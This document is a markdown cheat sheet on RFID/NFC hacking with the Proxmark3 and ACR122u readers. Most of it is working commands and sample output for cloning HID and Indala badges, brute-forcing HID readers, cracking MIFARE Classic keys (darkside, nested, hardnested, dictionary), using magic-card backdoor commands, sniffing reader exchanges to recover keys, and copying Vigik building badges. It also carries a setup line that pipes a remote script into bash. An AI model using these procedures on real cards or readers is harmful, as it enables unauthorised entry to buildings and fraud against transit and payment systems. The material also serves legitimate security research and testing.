# NFC - RFID

> Radio Frequency Identification (RFID) & Near Field Communication (NFC)


## Install and configuration

Dependencies to install first

```ps1
sudo apt-get install p7zip git build-essential libreadline5 libreadline-dev libusb-0.1-4 libusb-dev libqt4-dev perl pkg-config wget libncurses5-dev gcc-arm-none-eabi libstdc++-arm-none-eabi-newlib ncurses-dev libpcsclite-dev pcscd
```

Cloning and building the tool.

```powershell
git clone https://github.com/Proxmark/proxmark3.git
cd proxmark3
make clean && make all
dmesg | grep -i usb
~/proxmark3/client/proxmark3 /dev/ttyACM0
```

* Ubuntu : `curl https://raw.githubusercontent.com/daveio/attacksurface/master/proxmark3/pm3-setup.sh | bash`
* Kali : `Same script should work, just replace Ubuntu 14.04 by Kali`

Testing the tool with the commands `hw tune` and `hw version`.

```powershell
proxmark3> hw tune
Measuring antenna characteristics, please wait.........
# LF antenna: 73.70 V @   125.00 kHz
# LF antenna: 59.12 V @   134.00 kHz
# LF optimal: 73.97 V @   126.32 kHz
# HF antenna: 29.32 V @    13.56 MHz

proxmark3> hw version
Prox/RFID mark3 RFID instrument
uC: AT91SAM7S256 Rev D
Embedded Processor: ARM7TDMI
```

If the `ACR122` doesn't work properly, try `sudo rmmod pn533_usb`


### Update and flash

In order to update and flash your proxmark you have to kill the `ModemManager` process as it is interfering with the process.

```powershell
ps -aux | grep ModemManager
kill [pid] - on my system stable 521
```

By default the compilation makefile will target the Proxmark rdv4, to make a firmware and boot image for the Proxmark3 Easy you need to edit the `Makefile.platform` from `PLATFORM=PM3RDV4` to `PLATFORM=PM3OTHER`.

| PLATFORM      | DESCRIPTION              |
| ------------- | ------------------------ |
| PM3RDV4 (def) | Proxmark3 rdv4           |
| PM3OTHER      | Proxmark3 generic target |

The compilation steps are as follows.

```powershell
make armsrc/obj/fullimage.elf bootrom/obj/bootrom.elf client/flasher
./client/flasher /dev/ttyACM0 -b bootrom/obj/bootrom.elf armsrc/obj/fullimage.elf
```

## Notes about card types

* **MIFARE Classic 1K/4K**: basically just a memory storage device. This memory, either 1024 or 4096 bytes, is divided into sectors and blocks. Most of the time used for regular access badges and has really simple security mechanisms for access control
* **MIFARE Ultralight**: a 64 bytes version of MIFARE Classic. It’s low costs make it widely used as disposable tickets for events or transportation.
* **MIFARE Plus**: announced as a replacement of MIFARE Classic. The Plus subfamily brings the new level of security up to 128-bit AES encryption.
* **MIFARE DESFire**: those tags come pre-programmed with a general purpose DESFire operating system which offers a simple directory structure and files, and are the type of MIFARE offering the highest security levels.

## LF - HID & Indala

> Cloning requires writable T55xx card. The T55x7 card can be configured to emulate many of the 125 kHz tags.

```powershell
lf search               # HID Prox TAG ID: 2004263f88
lf hid fskdemod         # (Push the button on the PM3 to stop scanning - not necessary)
lf hid demod            # (Push the button on the PM3 to stop scanning - not necessary)
lf hid clone 2004263f88 # (id à cloner)
lf hid sim 200671012d   # simulate HID card with UID=200671012d

lf indala read
lf indala demod
lf indala sim a0000000c2c436c1   # simulate Indala with UID=a0000000c2c436c1
lf indala clone a0000000c2c436c1 # clone Indala to T55x7 card

lf hitag info
lf hitag sim c378181c_a8f7.ht2   # simulate HiTag
```

## LF - EM410X

Read only memory :/

```powershell
Proxmark> lf em4x em410xread
EM410x Tag ID: 23004d4dee
Proxmark> lf em4x em410xsim 23004d4dee
```

## HID : Example - Card

### HID card format

```powershell
proxmark3> lf hid decode 10001fc656
--------------------------------------------------          
       Format: H10302 (HID H10302 37-bit huge ID)          
  Card Number: 1041195          
       Parity: Valid          
--------------------------------------------------          
       Format: H10304 (HID H10304 37-bit)          
Facility Code: 1          
  Card Number: 516907          
       Parity: Valid          
-------------------------------------------------- 
```

### Write an HID card

```powershell
# version with facility code is better
proxmark3> lf hid encode H10304 f 49153 c 516907
HID Prox TAG ID: 1c001fc656         

proxmark3> lf hid encode H10302 c 1041195
HID Prox TAG ID: 10001fc656          
-------------------------------------------------
```

Example 2

```powershell
proxmark3> lf hid decode 1c0006bb43
--------------------------------------------------          
       Format: H10302 (HID H10302 37-bit huge ID)          
  Card Number: 220577          
       Parity: Valid          
--------------------------------------------------          
       Format: H10304 (HID H10304 37-bit)          
Facility Code: 49152          
  Card Number: 220577          
       Parity: Valid          
--------------------------------------------------          
proxmark3> lf hid encode H10302 c 220577
HID Prox TAG ID: 100006bb43  
```

### Bruteforce an HID reader

```powershell
pm3 --> lf hid brute a 26 f 224
pm3 --> lf hid brute v a 26 f 21 c 200 d 2000

Options
---
a <format>        :  26|33|34|35|37|40|44|84
f <facility-code> :  8-bit value HID facility code
c <cardnumber>    :  (optional) cardnumber to start with, max 65535
d <delay>         :  delay betweens attempts in ms. Default 1000ms
v                 :  verbose logging, show all tries
```

## HF - Mifare DESFire

> No known attacks yet ! Unencrypted sectors can be read, also you can try to look for default keys. All MIFARE cards are prone to relay attack.

*   Mifare DESFire [MF3ICD40](https://arstechnica.com/information-technology/2011/10/researchers-hack-crypto-on-rfid-smart-cards-used-for-keyless-entry-and-transit-pass/): uses Triple DES encryption, product discontinued.

    ```powershell
    It requires the attacker to have the card itself, an RFID reader, and a radio probe. 
    Using differential power analysis, data is collected from radio frequency energy 
    that leaks out of the card (its “side channels”).
    ```
* Mifare DESFire EV1 : the challenge is done with AES or 3DES.
* Mifare DESFire EV2

## HF - Mifare Ultra Light

* Ultralight C (3DES authentication)
* Ultralight EV1
* NTAG2

### Chinese backdoor

```powershell
pm3 --> hf 14a raw -p -b 7 40
pm3 --> hf 14a raw -p 43
pm3 --> hf 14a raw -p -c a20059982120

0x40, init backdoor mode
0x41, wipe fills card with 0xFF
0x42, fills card with 0x00
0x43, no authentication needed.  issue a 0x3000 to read block 0, or write block.
0x44, fills card with 0x55
```

### Simulate

```powershell
hf 14a sim 2 <7-byte tag>
```

## HF - Mifare Classic 1k

New method for Proxmark : `hf mf autopwn`

### Darkside attack (PRNG Weak)

**Proxmark method**

```powershell
pm3> hf search
pm3> hf mfu
pm3> hf mf darkside  (fork command)
pm3> hf mf mifare    (original command)
Parity is all zero. Most likely this card sends NACK on every failed authentication. # Card is empty...
or
Found valid key:ffffffffffff # KEY_FOUND

pm3> hf mf chk 0 A KEY_FOUND    (Check Found Key On Block 0 A)
```

**ACR122u method**

```powershell
# start cracking the first key of the first sector. 
mfcuk -C -R 0:A -v 3 -s 250 -S 250
mfcuk -C -R 3:A -v 3 -s 250 -S 250 -o mycard.mfc
```

### Nested attack (PRNG Weak)

> Need to find a default key to extract the others

**Proxmark method**

```powershell
hf search
hf mf chk 1 ? t                      # "Test Block Keys" command which will test the default keys for us
hf mf nested 1 0 A a0a1a2a3a4a5 t.   # "Nested Attack" use the key a0a1a2a3a4a5, keeping the key in memory with "t"
hf mf chk * ?                        # "Test Block Keys" command which will test the default keys for us
hf mf nested 1 0 A ffffffffffff   d  # "Nested Attack" use the key ffffffffffff to extract the others (file:dumpkeys.bin)
hf mf dump 1                         # Dump content
hf mf restore 1                      # Restore content into the card
hf mf wrbl 5 A 080808080808 32110000cdeeffff3211000005fa05fa  # write on block 5, with the key 0808... the content 3211...
hf mf rdbl 5 A 080808080808          # Read block 5 with the keu 0808..


python pm3_mfd2eml.py dumpdata.bin dumpdata.eml
pm3> hf mf cload dumpdata
```

**ACR122u method**

```powershell
nfc-list
mfoc -O card.mfd # dump the memory of the tag
# Le paramètre P permet de spécifier le nombre de sondes par secteur. Par défaut, ce nombre est à 20 mais nous pouvons le passer à 500.
mfoc -P 500 -O dump_first_try.dmp
nfc-mfclassic w a key.mfd data.mfd # write data
nfc-mfclassic W a key.mfd data.mfd # write data and sector 0
```

### Hardnested attack

> One key is needed in order to use this attack

For newest MIFARE Classic and MIFARE Plus SL1

**Proxmark method**

:warning: NOTE: These hardware changes resulted in the Proxmark 3 Easy being incapable of performing several of the Proxmark's advanced features, including the Mifare Hard-Nested attacks. In other word you need a real Proxmark, not a cheap chinese copy.

```powershell
# find a default key
# res column is either equal to 1 or 0. 
# A 1 in the column means the key was valid for that sector.
hf mf chk *1 ? t


# <block number> <key A|B> <key (12 hex symbols)>
# <target block number> <target key A|B> [known target key (12 hex symbols)] [w] [s]
# w: Acquire nonces and write them to binary file nonces.bin
hf mf hardnested 0 A 8829da9daf76 4 A w

# then https://github.com/aczid/crypto1_bs
./solve_piwi 0xcafec0de.bin
./solve_piwi_bs 0xcafec0de.bin
```

**ACR122u method**

With the key n°A a0a1a2a3a4a5 for sector 0 and we want key n°A for sector 1. This method can be reused for every sectors.

```powershell
./libnfc_crypto1_crack a0a1a2a3a4a5 0 a 4 a
Found tag with uid 62ef9e5a, collecting nonces for key A of block 4 (sector 1) using known key A a0a1a2a3a4a5 for block 0 (sector 0)
Collected 2379 nonces... leftover complexity 23833993588 (~2^34.47) - initializing brute-force phase...
Starting 4 threads to test 23833993588 states using 256-way bitslicing
Cracking...  88.93%
Found key: c44e2b5e4ce3
Tested 21232975852 states
```

### Magic Chinese Card - Acronyms

**UID** - The original Chinese Magic Backdoor card. These cards respond to the backdoor commands and will show Chinese magic backdoor commands (GEN 1a) detected when you do an hf search. These cards can be detected by probing the card to see if it responds to the backdoor commands. Some RFID systems may try to detect these cards.

**CUID** - The 2nd generation Chinese Magic Backdoor card. These cards do not use the backdoor commands, but instead allow Block 0 to be written to like any other block on the card. This gives the card better compatibility to be written to from an Android phone. However, some RFID systems can detect this type of card by sending a write command to Block 0, making the card invalid after the first use is attempted.

**FUID** - This type of card is not as common, but allows Block 0 to be written to just once. This allows you to create a clone of a card and any checks done by the RFID system will pass because Block 0 is no longer writable.

**UFUID** - This type of card is apparently a "better" version of the FUID card. Instead of only allowing Block 0 to be written once, you can write to it many times and then lock the block later when you're happy with the result. After locking Block 0, it cannot be unlocked to my knowledge. I do not think there is currently a way to lock these cards using the Proxmark3.

### Magic Chinese Card - GEN 2

They can be copied directly. The software allows a new UID.

### Magic Chinese Card - GEN 1a

> **Works better on the official client.py instead of the iceman fork.**

Reset a UID Changeable Magic Card (7 bytes UID) :warning: You should prefer this method !

```powershell
proxmark3> hf mf csetuid 42917CAB 0004 08
uid:42 91 7c ab           
--atqa:00 04  sak:08          
Chinese magic backdoor commands (GEN 1a) detected  
```

To set all the block `hf mf csetblk 0 42917CAB00080400022A2C87933EF21D`

NOTE: The UID from several cards can be computed with the displayed id, e.g: ID is 2910621770.

```python
import struct
struct.pack('<I',2910621770).encode('hex')
'4a907cad'
```

### Unbricking Chinese Magic Mifare Classic

If you set the wrong BCC for UID and can't read the card anymore, you can use some backdoor commands to change sector 0 using Proxmark:

```powershell
hf 14a raw -a -p -b 7 40
hf 14a raw -p 43
hf 14a raw -p -c a0 00
hf 14a raw -p -c de ad be ef 22 08 04 00 46 59 25 58 49 10 23 02
```

### Key Bruteforce/Dictionary attack

```powershell
hf mf chk *1 ? t                # Default keys
hf mf chk *1 ? d default_keys.dic
hf mf chk 0 A default_keys.dic  # Dictionary attack with file: default_keys.dic
```

### Write and read sectors

> Avoid writing wrbl 3 (contains key A/B + permissions)

```powershell
proxmark3> hf mf wrbl 1 a ffffffffffff 000102030405060708090a0b0c0d0e0f   
proxmark3> hf mf wrbl 2 a ffffffffffff 464c4147313a4d31664072335f303037
```

```powershell
hf mf rdsc <sector number> <key A/B> <key (12 hex symbols)>
```

### Dump Mifare card

```powershell
proxmark3> hf mf dump 1 k hf-mf-A29558E4-key.bin f hf-mf-A29558E4-data.bin

<card memory>: 0 = 320 bytes (Mifare Mini), 1 = 1K (default), 2 = 2K, 4 = 4K
k <name>     : key filename, if no <name> given, UID will be used as filename
f <name>     : data filename, if no <name> given, UID will be used as filename
```

### Simulate and emulate Mifare card

Emulate from a dump file

```powershell
# convert .bin to .eml
proxmark3> script run dumptoemul -i dumpdata.bin
proxmark3> hf mf eload <file name w/o .eml>
```

Simulate Mifare 1K UID

```powershell
proxmark3> hf mf sim u 353c2aa6
```

### MITM attack

```powershell
hf 14a snoop
# read card
# push button

hf list 14a
089220 |   095108 | Tag | 4d  xx  xx  xx  d3                                              |     | UID
114608 |   125072 | Rdr | 93  70  4d  xx  xx  xx  d3  4f  8d                              |  ok | SELECT_UID
...
525076 |   529748 | Tag | 61  7a  66  18                                                  |     | TAG CHALLENGE
540608 |   549920 | Rdr |50! 87!  8e  ab 3b!  49  5a  1b                                  | !crc| HALT
551188 |   555860 | Tag |d6! 53!  7c 57!                                                  |     | TAG RESPONSE
UID: 4dxxxxxxd3
TAG CHALLENGE: 617a6618
READER CHALLENGE: 50878eab
READER RESPONSE: 3b495a1b
TAG RESPONSE: d6537c57

# crapto1gui or mfkey
cd tools/mfkey
make
./mfkey64
./mfkey64 xxxxxxxx 3b45a45a 7ddb6646 142fc1b9 9195fb3f
```

### Reader only attack

Emulate a MIFARE Classic with a DEADBEEF UID.

```powershell
proxmark3> hf mf sim u deadbeef n 1 x
mf 1k sim uid: de ad be ef , numreads:0, flags:18 (0x12)
#db# Collected two pairs of AR/NR which can be used to extract keyA from reader for sector 1:
#db# ../tools/mfkey/mfkey32 deadbeef 0102xxxx 4d9axxxx 87e7xxxx 06d2xxxx b4a0xxxx
#db# Emulator stopped. Tracing: 1 trace length: 253
#db# 4B UID: deadbeef
```

### Read a Mifare Dump

```powershell
pip install bitstring
git clone https://github.com/zhovner/mfdread
mfdread.py ./dump.mfd
```

## HF - Mifare Classic 4k

### Chinese Magic Mifare Classic 4K

Block 0 is writable through normal Mifare Classic commands, i.e. there is not special “unlocked” read/write like in “magic Mifare 1k” version.

Writing block 0 with Proxmark, UID 01020304, using key A being FFFFFFFFFFFF:

```powershell
hf mf wrbl 0 a FFFFFFFFFFFF 01020304040000000000000000000000
```

Again, watch out to have correct BCC and avoid Cascading Tag (0x88) as first byte of UID, or you may make the card unselectable (i.e. brick it).

## HF - Vigik

Tool : https://github.com/cjbrigato/kigiv-for-proxmark3/releases

```powershell
modprobe -r pn533_usb
modprobe -r pn533
nfc-list # Vérifier le bon fonctionnement du lecteur
mfoc -P 500 -O carte-vierge.dmp # Extraire les clés de chiffrement de la puce RFID chinoise dans un fichier
mfoc -P 500 -O carte-originale.dmp # Copiez le contenu de la puce RFID d’origine dans un fichier
nfc-mfclassic W a carte-originale.dmp carte-vierge.dmp # Ecrire le contenu de la puce originale sur la puce chinoise
```

## Replay Attacks

Replay attack is a technique where a malicious user could implement a device to intercept a NFC transaction and redeem it later, using other device or even in different location. 


## Relay Attack
The relay attack is a technique where a malicious user implements a man in the middle attack. The attacker(APDUer) is capable to intercept, manipulate and change the transaction in real time to take advantage of it.  
[https://en.wikipedia.org/wiki/Relay_attack](https://en.wikipedia.org/wiki/Relay_attack)

* NFC Payment Relay Attacks - [intro-to-nfc-payment-relay-attacks/](https://salmg.net/2018/12/01/intro-to-nfc-payment-relay-attacks/)
* NFCopy85 is a 10 dollars device to make replay attacks against NFC payment systems - [nfcopy85](https://salmg.net/2019/06/16/nfcopy85/)


## References

* https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/
* https://aur.archlinux.org/packages/proxmark3/
* https://github.com/Proxmark/proxmark3/wiki/Kali-Linux
* https://github.com/Proxmark/proxmark3/wiki/Mifare-HowTo
* https://www.latelierdugeek.fr/2017/07/12/rfid-le-clone-parfait/
* https://github.com/cjbrigato/kigiv-for-proxmark3/releases
* http://guillaumeplayground.net/proxmark3-hardnested/
* https://www.ordinoscope.net/index.php/Electronique/Hardware/Divers/RFID/Proxmak3/Mf\_(Mifare)
* https://pi3rrot.net/wiki/doku.php?id=rfid:break\_mifare1k\_proxmark3
* https://connect.ed-diamond.com/MISC/MISCHS-016/Proxmark-3-le-couteau-suisse-RFID
* https://blandais.github.io/mifare/fr
* http://www.icedev.se/pm3docs.aspx
* http://www.icedev.se/pm3cmds.aspx
* https://scund00r.com/all/rfid/2018/06/05/proxmark-cheatsheet.html
* https://www.tinker.sh/badge-cloning-clone-hid-prox-with-proxmark3-rvd4/
* https://hackmethod.com/hacking-mifare-rfid/
* https://hackmethod.com/hacking-mifare-rfid-2/
* https://github.com/Proxmark/proxmark3/wiki/Mifare-Tag-Ops
* http://arishitz.net/coffee-nfc-exploit-coffee-again/
* https://thetraaaxx.org/writeup-irl-hacking-le-porte-monnaie-nfc-securise
* https://linuskarlsson.se/blog/acr122u-mfcuk-and-mfoc-cracking-mifare-classic-on-arch-linux/
* https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/cheatsheet.md
* https://smartlockpicking.com/slides/Confidence\_A\_2018\_Practical\_Guide\_To\_Hacking\_RFID\_NFC.pdf
